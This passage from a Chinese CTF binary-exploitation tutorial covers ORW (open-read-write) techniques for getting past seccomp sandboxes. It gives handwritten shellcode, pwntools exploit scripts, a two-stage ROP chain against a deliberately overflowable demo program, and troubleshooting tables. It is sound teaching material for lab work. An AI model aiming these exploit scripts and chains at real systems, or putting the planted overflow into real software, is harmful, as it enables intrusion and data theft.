    mov  rsi, rsp
    mov  edx, 0x100
    xor  eax, eax                 ; __NR_read = 0
    syscall
    test rax, rax
    jle  .done                    ; ≤ 0：读完（0）或出错（负数）
    mov  edx, eax                 ; 第 4 步：写出长度用 read 的返回值，不用请求值
    mov  edi, 1                   ; stdout
    mov  rsi, rsp
    mov  eax, 1                   ; __NR_write = 1
    syscall
    jmp  .read
.done:
    mov  eax, 60                  ; __NR_exit = 60
    xor  edi, edi
    syscall
```

文件名的安放全靠 push：先压一个全零的 rsi 当 `'\0'`，再压 `0x7478742e67616c66`——它是 `"flag.txt"` 八个字节按小端排成的整数，压栈后 rsp 处正好是 `"flag.txt\0"` 九个字节。==不依赖任何数据段==，shellcode 挪到哪都能用（5.4 的 jmp rsp 独立性是同一原则）。fd 转存进 r12d 也值得注意：read、write 每次都会改写 rax，==fd 要放在不会被系统调用碰的寄存器里==。

独立验证：

```bash
nasm -f elf64 orw_flag.s -o orw_flag.o && ld orw_flag.o -o orw_flag
./orw_flag
```

输出：

```
flag{p7_orw_via_syscall}
```

注入演示程序一（栈可执行、地址靠程序打印，5.2 的前提）。这里撞上 5.2 折叠框预告过的坑：这份手写 shellcode 有 80 余字节，超过 72 字节的窗口，按 at_buf 摆法会把返回地址槽自己盖掉。用同款解法 ==after_ret==：shellcode 挪到返回地址槽之后，返回地址指 `buf+80`——ret 弹出后 rsp 恰好指着 shellcode 第一个字节，它的 push 全部落在下方：

```python
#!/usr/bin/env python3
# exp_orw_sc.py —— 演示程序一：seccomp 禁了 execve，shellcode 改走 ORW
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

OFFSET = 72                       # buf 在 rbp-0x40：64 字节 buf + 8 字节 saved rbp

sc = asm('''
    xor  esi, esi
    push rsi
    mov  rax, 0x7478742e67616c66
    push rax
    mov  rdi, rsp
    xor  edx, edx
    mov  eax, 2
    syscall
    mov  r12d, eax
    sub  rsp, 0x100
read_loop:
    mov  edi, r12d
    mov  rsi, rsp
    mov  edx, 0x100
    xor  eax, eax
    syscall
    test rax, rax
    jle  read_done
    mov  edx, eax
    mov  edi, 1
    mov  rsi, rsp
    mov  eax, 1
    syscall
    jmp  read_loop
read_done:
    mov  eax, 60
    xor  edi, edi
    syscall
''')

io = process('./orw_sc')
io.recvuntil(b'buf=')
buf = int(io.recvline().strip(), 16)
success('buf @ ' + hex(buf))
# shellcode 挪到返回地址槽之后：ret 弹出 buf+80 后，rsp 恰指 shellcode 第一个字节
io.send(b'B' * OFFSET + p64(buf + OFFSET + 8) + sc)
print(io.recvall(timeout=3).decode(errors='replace').rstrip('\x00'))
io.close()
```

```bash
python3 exp_orw_sc.py
```

输出：

```
[x] Starting local process './orw_sc'
[+] Starting local process './orw_sc': pid 632
[+] buf @ 0x7ffebc6dc930
[x] Receiving all data
[x] Receiving all data: 7B
[*] Process './orw_sc' stopped with exit code 0 (pid 632)
[+] Receiving all data: Done (32B)
input> flag{p7_orw_via_syscall}
```

flag 直接打在 stdout 上：==没有 shell，flag 照拿==。

### 6.3 文件描述符与短读：两个最容易出错的细节

**fd 从几号开始。**进程一启动，0、1、2 已经被 stdin、stdout、stderr 占用，内核分配 fd 的规则是==取最低的空闲号==，所以演示里的 open 返回 3。但 3 不是定律：open 之前程序若还开过别的文件（配置、日志、Socket），号会顺延；一些题故意先 `close(1)` 再让 flag 被打开，flag 文件顶到 1 号，此后 `write(1, ...)` 打的就是 flag。==把 fd 写死在链里是 ORW 的经典事故==，正确姿势是把 open 的返回值一路带进 read——6.2 的 shellcode 用 r12d 转存就是这个目的。

**read 给多少不一定。**请求 0x100，返回可能正好 0x100，也可能更少——管道、Socket 这类通道上，==read 的返回值才是实际读到的字节数==。普通文件一次 read 常能读全；远程题里 flag 内容经过管道或 Socket 中转，短读随时发生。所以 6.2 的 shellcode 把写出长度取自 `mov edx, eax`（read 的返回值）而不是写死 0x100，外面再套一层循环，直到返回 0。

造一个必然出短读的现场：FIFO（命名管道）上一次写入 525 字节，循环版与无循环版分别去读。无循环版 `orw_flag_noloop.s` 与 6.2 的代码只差两处：read 之后没有 `test/jle/jmp` 的循环，写出长度固定 `mov edx, 0x100`：

```bash
rm -f flag.txt && mkfifo flag.txt
( printf 'flag{p7_short_read_loop}'; printf 'X%.0s' $(seq 500); printf '\n' ) > flag.txt &
sleep 0.3
./orw_flag > loop_out.txt              # 循环版
wait
rm -f flag.txt && mkfifo flag.txt
( printf 'flag{p7_short_read_loop}'; printf 'X%.0s' $(seq 500); printf '\n' ) > flag.txt &
sleep 0.3
./orw_flag_noloop > noloop_out.txt     # 无循环版
wait
wc -c loop_out.txt noloop_out.txt
```

输出：

```
 525 loop_out.txt
 256 noloop_out.txt
 781 total
```

循环版 525 字节一字不少；无循环版只有 0x100 字节，而且结尾不是数据：

```bash
tail -c 16 noloop_out.txt | xxd
```

输出：

```
00000000: 0000 0000 0000 0000 0000 0000 0000 0000  ................
```

末尾 16 个字节是 `\0`——旧栈上的内容。这正是短读的直接证据：那一次 read 实际返回的字节不足 0x100，write 却按请求值把整个缓冲写出，==缓冲里 read 没碰过的部分原样跟着出了门==。两句话收拢：==请求值决定"最多读多少"，返回值才是"实际读了多少"==，写出永远跟着返回值走。

> [!info]- fd 的更多玩法
> `dup2(oldfd, newfd)` 把一个 fd 复制到指定号上。除了 `close(1)` 让 flag 顶替 stdout，还有反向用法：`dup2(4, 1)` 把连着远程的 Socket（比如 4 号）顶替成 stdout，此后 ORW 的 write 直接打进连接。socat 托管的远程题里，0/1/2 之外常多出一个连着远端的 fd，动手前先弄清自己手里有哪几个号。

### 6.4 ORW 的 ROP 版：静态程序与两段链

演示程序二换回真实赛题最常见的配置：NX 开（栈上放不了 shellcode）、静态链接（gadget 海量，2.3 的检索流程直接复用）。seccomp 过滤器与演示程序一相同：

```c
/* orw_rop.c —— ORW 演示程序二：seccomp 白名单 + 静态链接（x86-64 Linux） */
#include <stdio.h>
#include <unistd.h>
#include <sys/prctl.h>
#include <linux/filter.h>
#include <linux/seccomp.h>
#include <linux/audit.h>
#include <sys/syscall.h>

/* install_seccomp() 与演示程序一完全相同：
   白名单 read/write/open/openat/close/exit/exit_group，源码见 6.1 */

char staging[0x200];   /* bss 里的固定落点：第一段链把文件名写在这里，第二段链从这里读 */

void vuln(void) {
    char buf[32];
    printf("input> ");
    read(0, buf, 0x300);          /* 漏洞点：0x300 进 32 字节 buf */
}

int main(void) {
    setbuf(stdout, NULL);
    install_seccomp();
    vuln();
    puts("bye");
    return 0;
}
```

```bash
gcc -O0 -fno-pie -no-pie -fno-stack-protector -static orw_rop.c -o orw_rop
```

输出：

```
orw_rop.c: In function 'vuln':
orw_rop.c:46:5: warning: 'read' writing 768 bytes into a region of size 32 overflows the destination [-Wstringop-overflow=]
   46 |     read(0, buf, 0x300);          /* 漏洞点：0x300 进 32 字节 buf */
      |     ^~~~~~~~~~~~~~~~~~~
……（note 行省略）
```

```bash
pwn checksec ./orw_rop
objdump -d -M intel orw_rop | sed -n '/<vuln>:/,/^$/p'
```

输出：

```
[*] '/home/hua/p7/orw_rop'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
0000000000401b45 <vuln>:
  401b45:	f3 0f 1e fa          	endbr64
  401b49:	55                   	push   rbp
  401b4a:	48 89 e5             	mov    rbp,rsp
  401b4d:	48 83 ec 20          	sub    rsp,0x20
  401b51:	bf 10 70 48 00       	mov    edi,0x487010
  401b56:	b8 00 00 00 00       	mov    eax,0x0
  401b5b:	e8 e0 37 00 00       	call   405340 <_IO_printf>
  401b60:	48 8d 45 e0          	lea    rax,[rbp-0x20]
  401b64:	ba 00 03 00 00       	mov    edx,0x300
  401b69:	48 89 c6             	mov    rsi,rax
  401b6c:	bf 00 00 00 00       	mov    edi,0x0
  401b71:	e8 1a 00 02 00       	call   421b90 <__libc_read>
  401b76:	90                   	nop
  401b77:	c9                   	leave
  401b78:	c3                   	ret
```

"Canary found" 是静态程序的符号误报（2.2 的 warning），反汇编里没有 `%fs:0x28`。`buf` 在 `rbp-0x20`，偏移 40；`read` 来自静态链入的 `__libc_read`——静态程序没有 PLT，调用直接落进文件内部（2.2 见过同款形态）。

新问题只有一个：==文件名字符串放哪==。程序里没有现成的路径串（2.3 折叠框讲过静态链接按需链入的缘故），栈地址又未知。2.3 折叠框预告过的==两段链==在这里兑现：

- **第一段**：借溢出拼一条 `read(0, staging, 0x10)`，把下一拍输入（文件名）写进 bss 里地址固定的落点，然后返回地址指回 `vuln`，再溢一次；
- **第二段**：`open(staging, 0, 0)` → `read(3, staging, 0x100)` → `write(1, staging, 0x100)` 三条 syscall 顺序拼装。

落点用源码里自备的全局数组（`const char sh[]` 的同款做法，2.3 折叠框），非 PIE 下地址是常量：

```bash
nm orw_rop | grep -w 'B staging'
```

输出：

```
00000000004b2aa0 B staging
```

gadget 检索（全量落盘后 grep，流程 2.3）：

```bash
ROPgadget --binary orw_rop > gadgets_rop.txt 2>/dev/null
grep -E ": pop (rax|rdi|rsi|rdx) ; ret$" gadgets_rop.txt
grep -E ": pop (rdi|rsi|rdx) ; (pop [a-z0-9]+|xor [a-z]+, [a-z]+)( ; pop [a-z0-9]+)* ; ret$" gadgets_rop.txt
```

输出：

```
0x000000000042ae03 : pop rax ; ret

0x000000000040250b : pop rdi ; pop rbp ; ret
0x00000000004748ca : pop rdx ; xor eax, eax ; pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret
0x0000000000402509 : pop rsi ; pop r15 ; pop rbp ; ret
0x00000000004028b3 : pop rsi ; pop rbp ; ret
0x0000000000443c89 : pop rsi ; xor rax, rdx ; pop r15 ; pop rbp ; ret
```

与 2.3 同一批型号：朴素版只有 rax；rdi、rsi 用带搭头的变体，多弹的寄存器垫废值；rdx 沿用 2.4 的排序纪律——它顺带 `xor eax, eax`，==必须排在装调用号之前==。

```python
#!/usr/bin/env python3
# exp_orw_rop.py —— 演示程序二：两段 ROP 链完成 ORW（静态链接，NX 开）
from pwn import *
import time

context.arch = 'amd64'
context.log_level = 'info'

OFFSET      = 40          # buf 在 rbp-0x20：32 字节 buf + 8 字节 saved rbp
POP_RDX     = 0x4748ca    # pop rdx ; xor eax, eax ; pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret
POP_RSI     = 0x4028b3    # pop rsi ; pop rbp ; ret
POP_RDI     = 0x40250b    # pop rdi ; pop rbp ; ret
POP_RAX     = 0x42ae03    # pop rax ; ret
SYSCALL     = 0x421c09    # 字节检索 0f 05 c3 命中的 syscall ; ret（链要续，syscall 必须带返回路径）
STAGING     = 0x4b2aa0    # nm orw_rop | grep staging：bss 里的固定落点

e  = ELF('./orw_rop', checksec=False)
io = process('./orw_rop')

# ---- 第一段：read(0, staging, 0x10) 把文件名送进 bss，再回到 vuln 等第二轮 ----
chain1 = flat(
    b'A' * OFFSET,
    POP_RDI, 0, 0,                 # rdi = 0（stdin）；废值弹进 rbp
    POP_RSI, STAGING, 0,           # rsi = staging；废值弹进 rbp
    POP_RDX, 0x10, 0, 0, 0, 0,     # rdx = 0x10；rax 被这条顺带清零；4 个废值弹进 rbx/r12/r13/rbp
    POP_RAX, 0,                    # rax = 0（read 的调用号）
    SYSCALL,
    e.symbols['vuln'],             # 回到 vuln，再溢一次
)
io.sendafter(b'input> ', chain1)
time.sleep(0.5)    # 等链上的 read(0, staging, 0x10) 真正停在内核里等输入；贴太紧会被 vuln 的 read 一口吞掉
io.send(b'flag.txt\x00'.ljust(0x10, b'\x00'))    # 第一段 read 读走的数据：文件名进 bss

# ---- 第二段：open → read → write 三条 syscall ----
chain2 = flat(
    b'A' * OFFSET,
    # open(staging, 0, 0)：返回 fd = 3（0/1/2 已被占用）
    POP_RDI, STAGING, 0,
    POP_RSI, 0, 0,
    POP_RDX, 0, 0, 0, 0, 0,
    POP_RAX, 2,                    # __NR_open = 2
    SYSCALL,
    # read(3, staging, 0x100)：flag 内容读进同一个 bss 缓冲
    POP_RDI, 3, 0,
    POP_RSI, STAGING, 0,
    POP_RDX, 0x100, 0, 0, 0, 0,
    POP_RAX, 0,                    # __NR_read = 0
    SYSCALL,
    # write(1, staging, 0x100)：写到 stdout
    POP_RDI, 1, 0,
    POP_RSI, STAGING, 0,
    POP_RDX, 0x100, 0, 0, 0, 0,
    POP_RAX, 1,                    # __NR_write = 1
    SYSCALL,
    POP_RAX, 60,                   # __NR_exit = 60；退出码在 rdi，残留着 write 的 1，无妨
    SYSCALL,
    0,
)
io.sendafter(b'input> ', chain2)
print(io.recvall(timeout=3).rstrip(b'\x00').decode(errors='replace'))
io.close()
```

```bash
python3 exp_orw_rop.py
```

输出：

```
[x] Starting local process './orw_rop'
[+] Starting local process './orw_rop': pid 636
[x] Receiving all data
[x] Receiving all data: 0B
[*] Process './orw_rop' stopped with exit code 1 (pid 636)
[x] Receiving all data: 256B
[+] Receiving all data: Done (256B)
flag{p7_orw_via_syscall}
```

256 字节里，flag 在最前面，后面的 `\x00` 是 `rstrip` 收走的尾部（staging 先装文件名、再被 flag 内容覆盖，位置没用满的部分一直是 0）。退出码 1 也对得上账：`exit` 的退出码在 rdi，链上没有装它，残留的是 write 用的 1——==无伤大雅，flag 已经出门==。

> [!warning] 第一段链上的 read 没有提示符，两拍要隔开
> vuln 的 read 前有 `input> ` 提示符，`sendafter` 能对表；第一段链执行到 `read(0, staging, 0x10)` 时==没有任何输出==，第二拍（文件名）如果发得太早，会被 vuln 的 read 和它一并吞进同一次调用，链的节奏全乱。exp 里两拍之间隔了 0.5 秒——与 2.4 的"命令要等 shell 起来"是同一族问题：==对不上号的节拍，用间隔对齐==。

> [!info]- syscall 的返回路径：本例为什么用字节检索
> 链上的 open、read、write 执行完都要==返回到链上的下一格==，`syscall` 之后的那条指令就是下一站。2.4 的 execve 链没这个问题——execve 成功即替换进程，永不返回。本例 grep gadget 全量文件，`syscall ; ret` 一条都没有：0x401298 的裸 `syscall` 落在 `rt_sigprocmask` 的函数体中间，走过去就是别人的逻辑，链当场散架。两个可靠解法：
>
> ==字节检索 `0f 05 c3`==——机器码层面的 `syscall ; ret`。指令可以从不对齐的地址开始，所以在可执行段里按字节找，不怕它不落在任何指令的边界上：
>
> ```bash
> python3 -c "
> from pwn import *
> context.log_level = 'error'
> e = ELF('./orw_rop', checksec=False)
> print([hex(a) for a in e.search(b'\x0f\x05\xc3')])
> "
> ```
>
> 输出：
>
> ```
> ['0x412976', '0x412995', '0x421c09', '0x450490', '0x4642e9', '0x466ca9']
> ```
>
> exp 取 0x421c09——它紧跟在 `__libc_write` 的 `syscall` 后面，地址好记。
>
> ==或者直接调 libc 函数==：nm 显示 `__libc_open`（0x421af0）、`__libc_read`（0x421b90）、`__libc_write`（0x421bb0）都已链入，把函数地址当 gadget 的 ret 落点用即可——不用装 rax、不用管返回路径，代价是依赖这几个符号恰好被静态链接进来。

> [!info]- 沙箱只放行 openat 时
> 现代 glibc 的 open 系函数内部全部走 `openat`，很多题的过滤器干脆只留 openat。链的改法：调用号换 257，参数四样——rdi = dirfd（相对路径的基准目录，"当前目录"用特殊值 `AT_FDCWD` = −100，装寄存器时写 `0xffffffffffffff9c`），rsi = 路径，rdx = flags，r10 = mode。r10 的 pop 片段少见，好在 O_RDONLY（0）打开时内核不读 mode，rdx = 0、r10 保持残留值即可；装 −100 与装普通常数无异，`pop rdi` 后面跟 `0xffffffffffffff9c` 就行。

### 6.5 出口切换的定位

ORW 改变的只有最后一步：==前置的偏移、泄露、控制流劫持，一切照旧==。它与前面的路线也不互斥——ret2libc 拿到第二轮的执行控制后，落点从 `system` 换成一条 ORW 链即可；堆题在 [[P16-FSOP与HouseofApple2#6. setcontext+0x35：一次调用换一整套寄存器|P16 第 6 节]]用 setcontext 把 rsp 搬到伪造的链上，搬过去跑的就是本章这条 ORW；[[P08-ROP进阶与SROP|P8]] 的 SROP 提供另一条整体控制寄存器的通道。本节的四个组件——==读过滤器、拼系统调用、管 fd、处理短读==——是所有沙箱题的公共基础；更复杂的限制（只留 openat 不留 open、把 write 换成 send 之类）打法相同：先 dump 白名单，再按它拼调用。

## 7. 路线对比

| | ret2syscall | ret2libc | one_gadget | ret2shellcode | ORW（第 6 节） |
| ---- | ---- | ---- | ---- | ---- | ---- |
| 目标 | shell | shell | shell | shell | 直读 flag |
| 交互轮数 | 1 | 2 | 2（第二步一个地址） | 1 | 1–2 |
| NX | 开着照用 | 开着照用 | 开着照用 | ==必须关== | ROP 版开着照用 |
| 静态/动态 | 静态最有利（gadget 齐全） | 动态专属 | 动态专属 | 皆可 | 皆可，静态最顺 |
| libc 信息 | 不需要 | ==必须确定版本== | 同左 | 不需要 | 不需要 |
| 输出通道 | 不需要 | 必须能借到 | 同左 | 不需要 | `write` 自己就是输出通道 |
| 常见失败原因 | 变体 gadget 的副作用没排序（如清 rax 的排在装号之后）；找不到 "/bin/sh" | 对齐没垫；版本不匹配（[[P03-ELF链接与延迟绑定\|P3]]）；泄露解析错位 | 约束不满足 | 坏字符；模板 push 蹭尾；页权限不对（bss） | fd 写死；写出长度用请求值；`syscall` 没有返回路径（6.4） |

骨架是同一副：==偏移（P6）+ 填充 + 地址串==。选择时把第 1 节的四个问题过一遍，路线就能定下来；做不出来时，失败原因那一列就是排错起点。ORW 不与它们并列竞争：控制 rip 之前的一切相同，它只在最后一步把 getshell 换成直读 flag——沙箱题的选型从 `seccomp-tools dump` 的白名单开始。

## 8. 常见问题

| 现象 | 原因与解决 |
| ---- | ---- |
| 静态程序 checksec 报 Canary found，溢出却没被拦 | 符号来自 glibc 内部自用的 `__stack_chk_fail`，不代表漏洞函数开了保护；看反汇编里有没有 `%fs:0x28`（2.2） |
| shell 起来了，发给它的命令没反应 | 命令发得太早，被 gets 底层缓冲一并吞掉，execve 换镜像后缓冲丢失；payload 与命令之间留间隔（2.4 的 warning） |
| ret2syscall 链执行到一半 rax 不是 59 | 变体 gadget 的副作用覆盖了先装的值：清 rax 的片段必须排在 `pop rax, 59` 之前（2.4） |
| 静态程序里搜不到 "/bin/sh" | 静态链接按需链入，没引用 system 一族就没有这份串；先写进 bss 再让 rdi 指过去（2.3 折叠框） |
| 第二轮发完直接 EOF，崩在 do_system 的 movaps | 16 字节对齐差 8：链首方向垫一格裸 ret（3.5，成因 [[P06-栈溢出原理与ret2win#5. 栈 16 字节对齐与 movaps 崩溃\|P6 第 5 节]]） |
| 推算的 libc 基址低 12 位不是 0 | 泄露少收了字节，或偏移用了另一版 libc：先核对收字节数，再做版本匹配（[[P03-ELF链接与延迟绑定#6.4 手工匹配完整流程\|P3 6.4]]） |
| `recvline` 解析泄露时混进了别的输出 | 轮与轮之间没清账：先收完本轮输出（泄露行），再等提示符发下一轮（3.6 的时序折叠框） |
| one_gadget 跳进去 execve 没成功 | 跳入时刻不满足它的约束：换候选，或垫 pop 调整 rsp 凑条件（第 4 节） |
| shellcode 跳过去就崩，地址明明是对的 | 先查坏字符（5.3），再查模板 push 深度是否蹭到自身（5.2 折叠框），最后确认目标页真的可执行（5.4） |
| 跳到 bss 里的 shellcode 段错误 | bss 页只有 rw 权限，`-z execstack` 只放开栈页；改走 jmp rsp 或 mprotect（5.4、5.5） |
| execstack 编译后 checksec 的 NX 行写着 unknown | 该工具对这类二进制的判读口径问题：以 `readelf -lW` 里 GNU_STACK 的 RWE 为准（5.1 的 note） |
| ROPgadget 搜不到想要的寄存器片段 | 朴素版没有就搜带搭头的变体，多垫废值；仍没有就把 `--depth` 加大或去 libc 里搜（[[P05-pwntools与GDB插件工具链#10. gadget 搜索：ROPgadget、ropper、one_gadget\|P5 第 10 节]]、2.3） |
| 沙箱题流程全对，进程却死在 -31 | 调用了白名单外的系统调用（SIGSYS）：`seccomp-tools dump` 对照白名单逐个查（6.1） |
| ORW 打出来是空内容或带脏数据 | 写出长度用了请求值而不是 read 的返回值（短读，6.3）；或 fd 号写死而 open 之前已有别的文件打开（6.3） |
| ORW 链执行到第一个 syscall 后就跑飞 | 裸 `syscall` 的下一站是别家代码：链要续，用 `syscall ; ret`（字节检索 `0f 05 c3`）或直接调 libc 函数（6.4 折叠框） |
| 第二拍文件名发过去没生效 | 链上的 read 没有提示符，发早了被 vuln 的 read 一口吞掉：两拍之间留间隔（6.4 的 warning） |
